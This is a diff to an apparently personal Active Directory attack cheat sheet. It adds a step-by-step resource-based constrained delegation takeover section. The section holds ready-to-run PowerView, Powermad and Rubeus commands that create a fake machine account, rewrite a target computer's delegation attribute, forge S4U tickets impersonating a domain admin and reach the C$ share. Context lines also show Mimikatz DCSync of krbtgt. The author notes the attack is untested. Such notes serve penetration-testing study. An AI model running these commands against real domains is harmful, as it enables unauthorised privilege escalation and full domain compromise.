@@ -9,6 +9,7 @@
   * [Unconstrained Delegation](#Unconstrained-delegation) 
     * [Printer Bug](#Printer-bug) 
   * [Constrained Delegation](#Constrained-delegation) 
+  * [Constrained Delegation Account Takeover](#Constrained-delegation-account-Takeover) 
 * [DNS Admins](#DNS-Admins)
 * [Trust abuse SQL](#Trust-abuse-SQL)
 * [Cross Domain attacks](#Cross-Domain-attacks)
@@ -343,6 +344,84 @@ Tgs::s4u /tgt:<kirbi file> /user:Administrator@<DOMAIN> /service:<SERVICE ALLOWE
 Invoke-Mimikatz -Command '"Kerberos::ptt <KIRBI FILE>"'
 Invoke-Mimikatz -Command '"lsadump::dcsync /user:<DOMAIN>\krbtgt"'
 ```
+
+## Constrained Delegation Account Takeover
+- Requires the following:
+  - An owned system
+  - Write privileges on another computerobject
+  - Being able to join computers to the domain 
+- https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution
+
+#### Check who can add computers to the domain
+```
+(Get-DomainPolicy -Policy DC).PrivilegeRights.SeMachineAccountPrivilege.Trim("*") | Get-DomainObject | Select-Object name
+
+Get-DomainObject | Where-Object ms-ds-machineaccountquota
+```
+
+#### Check if domain controller is atleast Windows Server 2012
+```
+Get DomainController
+```
+
+#### Check if target doesn't have msds-AllowedToActOnBehalfOfOtherIdentity
+```
+Get-DomainComputer <COMPUTERNAME> 
+Get-DomainComputer <COMPUTERNAME> | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+```
+
+#### Create a new computer object
+- https://github.com/Kevin-Robertson/Powermad
+```
+import-module powermad
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+```
+
+#### Check if object is created
+- Cop the sid
+```
+Get-DomainComputer fake01
+```
+
+#### Creata a new raw security descriptor
+- Using the sid from previous command
+``` 
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;<SID NEW COMPUTER>)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+```
+
+#### Modify the target computer object
+```
+Get-DomainComputer <TARGET COMPUTER> | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes} -Verbose
+```
+
+#### Check if modification worked
+```
+Get-DomainComputer <TARGET COMPUTER> -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+#### Check raw security descriptor refering to the correct machine
+```
+(New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0).DiscretionaryAcl
+```
+
+#### Generate RC4 hash for the made computer object
+```
+Rubeus.exe hash /password:123456 /user:fake01 /domain:<DOMAIN>
+```
+
+#### Impersonate another user (For example DA)
+```
+rubeus.exe s4u /user:fake01$ /rc4:32ED87BDB5FDC5E9CBA88547376818D4 /impersonateuser:<TARGET USER DA> /msdsspn:cifs/<TARGET COMPUTER> /ptt
+```
+
+#### Access the C Disk
+```
+dir \\<COMPUTER>\C$
+```
+
+If the dir doesn't work read the blogpost! That might tell you why! (Didn't test the attack myself yet)
 
 ## DNS Admins
 #### Enumerate member of the DNS admin group
